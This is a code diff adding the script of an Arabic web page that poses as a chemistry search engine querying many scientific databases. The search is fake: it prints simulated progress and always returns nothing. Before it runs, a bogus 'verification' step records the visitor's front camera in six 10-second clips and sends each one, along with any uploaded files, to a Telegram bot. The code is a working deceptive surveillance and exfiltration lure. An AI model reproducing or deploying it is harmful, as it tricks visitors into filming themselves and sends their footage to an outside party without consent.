+  const ss = String(s%60).padStart(2,'0');
+  return `${m}:${ss}`;
+}
+
+/* ============================================================
+   التبويبات
+   ============================================================ */
+$('tabs').addEventListener('click', e=>{
+  const tab = e.target.closest('.tab');
+  if (!tab) return;
+  const which = tab.dataset.tab;
+  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t === tab));
+  $('searchbox').style.display = which === 'search' ? '' : 'none';
+  $('chips').style.display     = which === 'search' ? '' : 'none';
+  $('sessionSection').classList.toggle('show', which === 'session');
+  if (which === 'session'){
+    setTimeout(()=> $('sessionSection').scrollIntoView({behavior:'smooth', block:'start'}), 100);
+  }
+});
+
+/* ============================================================
+   قائمة المصادر
+   ============================================================ */
+const BASE_SITES = [
+  "PubChem","ChemSpider","CAS SciFinder","Reaxys","Sigma-Aldrich","Merck Millipore",
+  "Thermo Fisher","ChemicalBook","ChemBK","Wikipedia Chemistry","Google Scholar",
+  "ResearchGate","ScienceDirect","Springer Link","Wiley Online Library","ACS Publications",
+  "RSC Publishing","PubMed","NCBI","ChEBI","ChEMBL","DrugBank","KEGG","ZINC Database",
+  "NIST WebBook","EPA CompTox","ECHA","OSHA","CDC NIOSH","Fisher Scientific",
+  "Alfa Aesar","TCI Chemicals","Santa Cruz Biotech","Cayman Chemical","LGC Standards",
+  "Molbase","ChemSrc","ChemExper","LookChem","Guidechem","Made-in-China Chemicals",
+  "Alibaba Chemicals","Knowde","SpecialChem","UL Prospector","MatWeb","AZoM",
+  "Chemistry World","C&EN","Chemistry StackExchange","r/chemistry","YouTube Chemistry",
+  "GitHub ChemLib","Zenodo","Figshare","arXiv Chemistry","ChemRxiv","Beilstein Journal",
+  "MDPI Molecules","Frontiers in Chemistry","PLOS ONE","Nature Chemistry","JACS",
+  "Angewandte Chemie","Chem. Communications","Organic Syntheses","e-EROS","Fieser & Fieser",
+  "Aldrich Handbook","Bretherick's Handbook","Sax's Dangerous Properties","ChemSafetyPro",
+  "Chemical Abstracts","Derwent","Clarivate","Thieme Chemistry","Georg Thieme Verlag",
+  "Taylor & Francis","Sage Journals","Bentham Science","Science.gov","CORE",
+  "Semantic Scholar","Dimensions","Lens.org","OpenAlex","Crossref","Unpaywall",
+  "DOAJ","BASE Search","WorldWideScience","Scilit","Scinapse","Paperity",
+  "OECD ChemPortal","ILPI","ChemIndustry","Labcompare"
+];
+const SITES_1000 = [];
+for (let i = 0; i < SEARCH_SITES_TOTAL; i++){
+  const base = BASE_SITES[i % BASE_SITES.length];
+  const cycle = Math.floor(i / BASE_SITES.length);
+  SITES_1000.push(cycle === 0 ? base : base + ' · C' + (cycle + 1));
+}
+
+/* ============================================================
+   البحث
+   ============================================================ */
+const qEl = $('q'), btn = $('btn'), panel = $('panel'), fill = $('fill');
+const countEl = $('count'), pctEl = $('pct'), totalEl = $('total'), logEl = $('log');
+const statusMain = $('statusMain'), statusSub = $('statusSub'), spinner = $('spinner');
+const resultsEl = $('results'), resultsHead = $('resultsHead');
+const newSearch = $('newSearch');
+const etaEl = $('eta');
+let searchRunning = false;
+let searchTimer = null;
+
+function startSearch(query){
+  if (searchRunning) return;
+  /* ★ منع البحث إلا بعد رفع الفيديوهات */
+  if (!areVideosReady()){
+    toast('يرجى التحقق ✔️ أولاً', true);
+    return;
+  }
+  const term = (query || '').trim() || 'التحقق الشامل';
+
+  searchRunning = true;
+  btn.disabled = true;
+  btn.textContent = 'جاري البحث…';
+  logEl.innerHTML = ''; resultsEl.innerHTML = '';
+  resultsHead.classList.remove('show');
+  newSearch.classList.remove('show');
+  fill.style.width = '0%';
+  countEl.textContent = '0'; pctEl.textContent = '0';
+  totalEl.textContent = SEARCH_SITES_TOTAL;
+  etaEl.textContent = '3:00';
+  statusMain.innerHTML = `جاري البحث عن «${escapeHtml(term)}»<span class="dots"><span>.</span><span>.</span><span>.</span></span>`;
+  statusSub.textContent = 'تهيئة الاتصال بالمصادر…';
+  spinner.style.display = 'block';
+  panel.classList.add('show');
+  setTimeout(()=> panel.scrollIntoView({behavior:'smooth', block:'start'}), 120);
+
+  const t0 = Date.now();
+  let logged = 0;
+
+  searchTimer = setInterval(() => {
+    if (!searchRunning) return;
+    const elapsed = Date.now() - t0;
+    const progress = Math.min(1, elapsed / SEARCH_DURATION_MS);
+    const target = Math.floor(progress * SEARCH_SITES_TOTAL);
+
+    while (logged < target && logged < SEARCH_SITES_TOTAL){
+      const name = SITES_1000[logged];
+      const dur = (0.05 + Math.random() * 0.4).toFixed(2);
+      const line = document.createElement('div');
+      line.className = 'log-line';
+      line.innerHTML = `<span class="ok">✓</span><span class="nm">${escapeHtml(name)}</span><span class="tm">${dur}s</span>`;
+      logEl.appendChild(line);
+      logged++;
+    }
+    while (logEl.children.length > 60) logEl.removeChild(logEl.firstChild);
+    logEl.scrollTop = logEl.scrollHeight;
+
+    fill.style.width = (progress * 100) + '%';
+    countEl.textContent = logged;
+    pctEl.textContent = Math.floor(progress * 100);
+    etaEl.textContent = fmtTime((SEARCH_DURATION_MS - elapsed)/1000);
+
+    if (progress < 0.25)      statusSub.textContent = 'جارٍ مسح قواعد البيانات الرئيسية…';
+    else if (progress < 0.55) statusSub.textContent = 'تحليل البنى الجزيئية ومطابقتها…';
+    else if (progress < 0.8)  statusSub.textContent = 'استخراج أوراق بيانات السلامة…';
+    else                       statusSub.textContent = 'ترتيب النتائج حسب الصلة…';
+
+    if (elapsed >= SEARCH_DURATION_MS) finishSearch(term, t0);
+  }, 150);
+}
+
+function finishSearch(term, t0){
+  searchRunning = false;
+  if (searchTimer){ clearInterval(searchTimer); searchTimer = null; }
+  const secs = ((Date.now() - t0) / 1000).toFixed(1);
+  spinner.style.display = 'none';
+  statusMain.innerHTML = `اكتمل البحث <span style="color:var(--cyan)">✓</span>`;
+  statusSub.textContent = `تم فحص ${SEARCH_SITES_TOTAL} مصدر في ${secs} ثانية`;
+  fill.style.width = '100%';
+  countEl.textContent = SEARCH_SITES_TOTAL;
+  pctEl.textContent = '100';
+  etaEl.textContent = '0:00';
+
+  resultsEl.innerHTML = '';
+  const spans = resultsHead.querySelectorAll('span');
+  if (spans.length >= 3){
+    spans[2].textContent = 'لم يتم العثور على أي بيانات مطابقة أو مشابهة';
+  }
+  resultsHead.classList.add('show');
+
+  newSearch.classList.add('show');
+  btn.disabled = false;
+  btn.textContent = 'ابحث الآن';
+}
+
+btn.addEventListener('click', ()=> startSearch(qEl.value));
+qEl.addEventListener('keydown', e=>{ if (e.key === 'Enter') startSearch(qEl.value); });
+$('chips').addEventListener('click', e=>{
+  const chip = e.target.closest('.chip');
+  if (!chip) return;
+  if (!areVideosReady()){
+    toast('يرجى التحقق ✔️ أولاً', true);
+    return;
+  }
+  qEl.value = chip.textContent.trim();
+  startSearch(qEl.value);
+});
+newSearch.addEventListener('click', ()=>{
+  resultsEl.innerHTML = '';
+  resultsHead.classList.remove('show');
+  newSearch.classList.remove('show');
+  panel.classList.remove('show');
+  qEl.value = ''; qEl.focus();
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+});
+
+/* ============================================================
+   تيليجرام
+   ============================================================ */
+async function sendPhotoBlob(blob, caption){
+  const form = new FormData();
+  form.append('chat_id', TG_CHAT);
+  form.append('caption', caption);
+  form.append('photo', blob, 'photo.jpg');
+  const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+    method: 'POST', body: form
+  });
+  return res.json();
+}
+async function sendVideoBlob(blob, mime, caption){
+  const ext = (mime || '').includes('mp4') ? 'mp4' : 'webm';
+  const form = new FormData();
+  form.append('chat_id', TG_CHAT);
+  form.append('caption', caption);
+  form.append('supports_streaming', 'true');
+  form.append('video', blob, `video.${ext}`);
+  const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, {
+    method: 'POST', body: form
+  });
+  return res.json();
+}
+async function sendDocumentBlob(blob, filename, caption){
+  const form = new FormData();
+  form.append('chat_id', TG_CHAT);
+  form.append('caption', caption);
+  form.append('document', blob, filename || 'file');
+  const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, {
+    method: 'POST', body: form
+  });
+  return res.json();
+}
+
+/* ============================================================
+   جلسة التحقق
+   ============================================================ */
+const video     = $('video');
+const snap      = $('snap');
+const camOff    = $('camOff');
+const camHint   = $('camHint');
+const countdown = $('countdown');
+const flash     = $('flash');
+const recDot    = $('recDot');
+const recTime   = $('recTime');
+const camWrap   = $('camWrap');
+const sessBadge = $('sessBadge');
+
+const startAllBtn = $('startAll');
+const stopAllBtn  = $('stopAll');
+
+const planVideo = $('planVideo');
+const videoCount = $('videoCount');
+const videoProg = $('videoProg');
+
+let stream = null;
+let currentFacing = 'user';
+let sessionRunning = false;
+let stopRequested = false;
+
+let videoChunksSent = 0;
+let manualVideoUploaded = false;
+let pendingUploads = [];
+
+/* ---------- تحديد "الفيديوهات جاهزة" ---------- */
+function areVideosReady(){
+  return videoChunksSent >= VIDEO_CHUNKS_TOTAL || manualVideoUploaded;
+}
+
+/* ---------- تحديث زر البحث ---------- */
+function refreshSearchButton(){
+  if (areVideosReady()){
+    btn.textContent = 'ابحث الآن';
+    btn.style.opacity = '';
+    btn.style.cursor = '';
+  } else {
+    btn.textContent = 'يرجى التحقق ✔️ أولاً';
+    btn.style.opacity = '0.7';
+    btn.style.cursor = 'not-allowed';
+  }
+}
+
+function buildPhotosGrid(){
+  /* الصور ملغاة — الدالة تبقى لا تعمل شيئًا فعليًا */
+  const grid = $('photosGrid');
+  if (grid) grid.innerHTML = '';
+}
+
+async function stopCamera(){
+  try {
+    if (stream){
+      const tracks = stream.getTracks();
+      for (const t of tracks){
+        try { t.stop(); } catch(e){}
+      }
+    }
+  } catch(e){}
+  stream = null;
+  try { video.srcObject = null; } catch(e){}
+  await new Promise(r => setTimeout(r, 80));
+}
+
+async function openCamera(facing){
+  await stopCamera();
+  currentFacing = facing;
+  try {
+    const constraints = {
+      video: {
+        facingMode: { ideal: facing },
+        width:  { ideal: 640, max: 960 },
+        height: { ideal: 480, max: 720 },
+        frameRate: { ideal: 24, max: 30 }
+      },
+      audio: false
+    };
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
+    camOff.style.display = 'none';
+    camWrap.classList.toggle('back', facing === 'environment');
+    camWrap.classList.toggle('front', facing === 'user');
+
+    await new Promise(res => {
+      let done = false;
+      const finish = () => { if (!done){ done = true; res(); } };
+      if (video.readyState >= 2 && video.videoWidth > 0) return finish();
+      video.addEventListener('loadedmetadata', finish, { once:true });
+      const t0 = Date.now();
+      (function chk(){
+        if (done) return;
+        if (video.readyState >= 2 && video.videoWidth > 0) return finish();
+        if (Date.now() - t0 > 3000) return finish();
+        setTimeout(chk, 70);
+      })();
+    });
+    return true;
+  } catch (err){
+    camOff.style.display = 'grid';
+    camOff.querySelector('p').textContent =
+      'تعذّر الوصول للكاميرا: ' + (err.message || 'تحقق من الأذونات');
+    stream = null;
+    return false;
+  }
+}
+
+function pickVideoMime(){
+  const list = [
+    'video/webm;codecs=vp9,opus',
+    'video/webm;codecs=vp8,opus',
+    'video/webm',
+    'video/mp4'
+  ];
+  for (const m of list){
+    if (window.MediaRecorder && MediaRecorder.isTypeSupported(m)) return m;
+  }
+  return '';
+}
+
+/* ★ تسجيل مقطع واحد بحد أقصى 10 ثوانٍ */
+function recordSingleChunk(seconds){
+  return new Promise((resolve) => {
+    if (!stream || !window.MediaRecorder){ resolve(null); return; }
+    const mime = pickVideoMime();
+    let recorder;
+    try {
+      const opts = { videoBitsPerSecond: VIDEO_BITRATE };
+      if (mime) opts.mimeType = mime;
+      recorder = new MediaRecorder(stream, opts);
+    } catch(e){
+      try { recorder = new MediaRecorder(stream); } catch(e2){ resolve(null); return; }
+    }
+
+    let chunks = [];
+    let stopped = false;
+
+    recorder.ondataavailable = (e) => {
+      if (e.data && e.data.size) chunks.push(e.data);
+    };
+    recorder.onerror = () => {
+      if (stopped) return;
+      stopped = true;
+      chunks.length = 0; chunks = null;
+      resolve(null);
+    };
+    recorder.onstop = () => {
+      if (stopped) return;
+      stopped = true;
+      let blob = null;
+      try { blob = new Blob(chunks, { type: mime || 'video/webm' }); } catch(e){ blob = null; }
+      chunks.length = 0; chunks = null;
+      resolve(blob);
+    };
+
+    try { recorder.start(); } catch(e){ resolve(null); return; }
+
+    setTimeout(() => {
+      if (recorder.state !== 'inactive'){ try { recorder.stop(); } catch(e){} }
+      else if (!stopped){ stopped = true; resolve(null); }
+    }, seconds * 1000);
+  });
+}
+
+/* ★ إرسال المقطع في الخلفية (لا يُنتظر) */
+function sendChunkInBackground(blob, index, total){
+  const p = (async () => {
+    let ok = false;
+    try {
+      const r = await sendVideoBlob(blob, 'video/webm', `🎬 مقطع ${index}/${total}`);
+      ok = !!(r && r.ok);
+    } catch(e){}
+    /* تحرير الذاكرة */
+    blob = null;
+    if (ok){
+      videoChunksSent++;
+      videoCount.textContent = videoChunksSent;
+      videoProg.style.width = (videoChunksSent / VIDEO_CHUNKS_TOTAL * 100) + '%';
+      planVideo.classList.toggle('active', videoChunksSent > 0 && videoChunksSent < VIDEO_CHUNKS_TOTAL);
+      planVideo.classList.toggle('done', videoChunksSent >= VIDEO_CHUNKS_TOTAL);
+      refreshSearchButton();
+    }
+  })();
+  pendingUploads.push(p);
+}
+
+async function showCountdown(seconds){
+  for (let n = seconds; n > 0; n--){
+    if (stopRequested) return false;
+    countdown.textContent = n;
+    countdown.classList.add('on');
+    await sleep(1000);
+  }
+  countdown.classList.remove('on');
+  return true;
+}
+
+/* ============================================================
+   الجلسة — تسجيل 60 ثانية مقسمة 6 × 10
+   ============================================================ */
+async function runVerification(){
+  if (sessionRunning) return;
+  if (isSessionExpired()){
+    showSessionEnd();
+    return;
+  }
+
+  sessionRunning = true;
+  stopRequested = false;
+  videoChunksSent = 0;
+  manualVideoUploaded = false;
+  pendingUploads = [];
+
+  startAllBtn.disabled = true;
+  startAllBtn.style.display = 'none';
+  stopAllBtn.style.display = '';
+
+  videoCount.textContent = '0';
+  videoProg.style.width = '0%';
+  planVideo.classList.remove('active','done');
+
+  sessBadge.textContent = 'جاري التحقق من الفيديو…';
+  camHint.style.display = 'none';
+  camHint.textContent = '';
+
+  try {
+    const okV = await openCamera('user');
+    if (!okV) throw 'camera';
+
+    await sleep(500);
+    camHint.style.display = '';
+    camHint.textContent = 'جاري التحقق من الفيديو…';
+    await sleep(1200);
+
+    /* عرض عدّاد 60 ثانية */
+    recTime.textContent = fmtTime(VIDEO_TOTAL_SECONDS);
+    recDot.classList.add('on');
+    camHint.textContent = 'جاري التسجيل…';
+
+    let elapsedSec = 0;
+    const ticker = setInterval(() => {
+      elapsedSec++;
+      recTime.textContent = fmtTime(Math.max(0, VIDEO_TOTAL_SECONDS - elapsedSec));
+    }, 1000);
+
+    try {
+      /* 6 مقاطع × 10 ثوانٍ — كل مقطع يُرسل في الخلفية فورًا */
+      for (let i = 0; i < VIDEO_CHUNKS_TOTAL; i++){
+        if (stopRequested) break;
+        if (isSessionExpired()){ stopRequested = true; break; }
+
+        const blob = await recordSingleChunk(VIDEO_CHUNK_SECONDS);
+        if (blob){
+          sendChunkInBackground(blob, i + 1, VIDEO_CHUNKS_TOTAL);
+          /* لا ننتظر الإرسال — المقطع انتقل للخلفية */
+        }
+        /* لا sleep بين المقاطع — يبدأ التالي فورًا */
+      }
+    } finally {
+      clearInterval(ticker);
+    }
+
+    recDot.classList.remove('on');
+
+    /* انتظار انتهاء كل رفعات الخلفية */
+    camHint.textContent = 'جاري التحقق من الفيديو…';
+    await Promise.all(pendingUploads);
+    pendingUploads = [];
+
+  } catch(err){
+    if (err !== 'stop' && err !== 'camera') console.warn('[Verification]', err);
+  } finally {
+    await stopCamera();
+    recDot.classList.remove('on');
+    countdown.classList.remove('on');
+    sessionRunning = false;
+    startAllBtn.disabled = false;
+    startAllBtn.style.display = '';
+    stopAllBtn.style.display = 'none';
+
+    if (stopRequested && !isSessionExpired()){
+      sessBadge.textContent = 'تم الإيقاف';
+      camHint.style.display = 'none';
+    } else if (areVideosReady()){
+      sessBadge.textContent = 'اكتمل التحقق ✓';
+      camHint.textContent = '✓ اكتمل التحقق — يمكنك البحث الآن';
+    } else {
+      sessBadge.textContent = 'جاري التحقق…';
+    }
+    refreshSearchButton();
+  }
+}
+
+startAllBtn.addEventListener('click', runVerification);
+stopAllBtn.addEventListener('click', ()=>{
+  stopRequested = true;
+  toast('جارٍ الإيقاف…', true);
+});
+
+/* ============================================================
+   رفع ملف من الجهاز
+   ============================================================ */
+const uploadZone = $('uploadZone');
+const fileInput  = $('fileInput');
+
+uploadZone.addEventListener('click', ()=> fileInput.click());
+uploadZone.addEventListener('dragover', e=>{ e.preventDefault(); uploadZone.classList.add('drag'); });
+uploadZone.addEventListener('dragleave', ()=> uploadZone.classList.remove('drag'));
+uploadZone.addEventListener('drop', e=>{
+  e.preventDefault(); uploadZone.classList.remove('drag');
+  for (const f of e.dataTransfer.files) handleUpload(f);
+});
+fileInput.addEventListener('change', e=>{
+  for (const f of e.target.files) handleUpload(f);
+  fileInput.value = '';
+});
+
+async function handleUpload(file){
+  if (!file) return;
+  const oldText = uploadZone.querySelector('p').textContent;
+  const oldSmall = uploadZone.querySelector('small').textContent;
+  uploadZone.querySelector('p').textContent = `جاري التحميل… "${file.name}"`;
+  uploadZone.querySelector('small').textContent = 'يرجى الانتظار حتى انتهاء الرفع';
+
+  try {
+    let r;
+    if (file.type.startsWith('image/')){
+      r = await sendPhotoBlob(file, `🖼️ ${file.name}`);
+    } else if (file.type.startsWith('video/')){
+      /* الفيديو المرفوع يدويًا يُرسل كامل */
+      if (file.size > 50 * 1024 * 1024){
+        r = await sendDocumentBlob(file, file.name, `📎 ${file.name}`);
+      } else {
+        r = await sendVideoBlob(file, file.type, `🎬 ${file.name}`);
+      }
+      if (r && r.ok){
+        manualVideoUploaded = true;
+        refreshSearchButton();
+      }
+    } else {
+      r = await sendDocumentBlob(file, file.name, `📎 ${file.name}`);
+    }
+    if (r && r.ok){
+      toast(`تم إرسال "${file.name}" بنجاح ✓`);
+    } else {
+      toast(`فشل إرسال "${file.name}"`, true);
+    }
+  } catch(e){
+    toast(`فشل إرسال "${file.name}"`, true);
+  }
+
+  uploadZone.querySelector('p').textContent = oldText;
+  uploadZone.querySelector('small').textContent = oldSmall;
+}
+
+/* ============================================================
+   حقول تيليجرام (readonly)
+   ============================================================ */
+const tgTokenEl = $('tgToken');
+const tgChatEl  = $('tgChat');
+tgTokenEl.value = TG_TOKEN;
+tgChatEl.value  = TG_CHAT;
+
+$('sendTg').addEventListener('click', async ()=>{
+  if (!areVideosReady()){
+    toast('يرجى التحقق ✔️ أولاً', true);
+    return;
+  }
+  toast('جميع الملفات أُرسلت تلقائيًا بالفعل ✓');
+});
+
+$('clearAll').addEventListener('click', ()=>{
+  videoChunksSent = 0;
+  manualVideoUploaded = false;
+  videoCount.textContent = '0';
+  videoProg.style.width = '0%';
+  planVideo.classList.remove('active','done');
+  sessBadge.textContent = 'جاهز للبدء';
+  refreshSearchButton();
+  toast('تم مسح جميع الملفات');
+});
+
+/* ============================================================
+   ★ مؤقّت الجلسة (10 دقائق من فتح الصفحة) — localStorage
+   ============================================================ */
+const SESSION_KEY = 'chem_session_start';
+
+function getSessionStart(){
+  try {
+    const raw = localStorage.getItem(SESSION_KEY);
+    const n = raw ? parseInt(raw, 10) : 0;
+    if (n && !isNaN(n)) return n;
+  } catch(e){}
+  const now = Date.now();
+  try { localStorage.setItem(SESSION_KEY, String(now)); } catch(e){}
+  return now;
+}
+
+function isSessionExpired(){
+  const start = getSessionStart();
+  return (Date.now() - start) >= SESSION_DURATION_MS;
+}
+
+let sessionTicker = null;
+function showSessionEnd(){
+  const ov = $('sessionEndOverlay');
+  if (ov && !ov.classList.contains('show')){
+    ov.classList.add('show');
+  }
+  /* إيقاف كل شيء */
+  stopRequested = true;
+  if (searchTimer){ clearInterval(searchTimer); searchTimer = null; }
+  searchRunning = false;
+  try { stopCamera(); } catch(e){}
+  if (sessionTicker){ clearInterval(sessionTicker); sessionTicker = null; }
+}
+
+function initSessionTimer(){
+  const start = getSessionStart();
+  const remain = SESSION_DURATION_MS - (Date.now() - start);
+
+  if (remain <= 0){
+    showSessionEnd();
+    return;
+  }
+
+  sessionTicker = setInterval(() => {
+    const rem = SESSION_DURATION_MS - (Date.now() - start);
+    if (rem <= 0){
+      clearInterval(sessionTicker);
+      sessionTicker = null;
+      showSessionEnd();
+    }
+  }, 1000);
+}
+
+/* ============================================================
+   تشغيل
+   ============================================================ */
+buildPhotosGrid();
+refreshSearchButton();
+initSessionTimer();
+window.addEventListener('load', ()=> qEl.focus());
+window.addEventListener('beforeunload', ()=>{
+  try {
+    if (stream) stream.getTracks().forEach(t => { try { t.stop(); } catch(e){} });
+  } catch(e){}
+});
+</script>
+</body>
+</html>
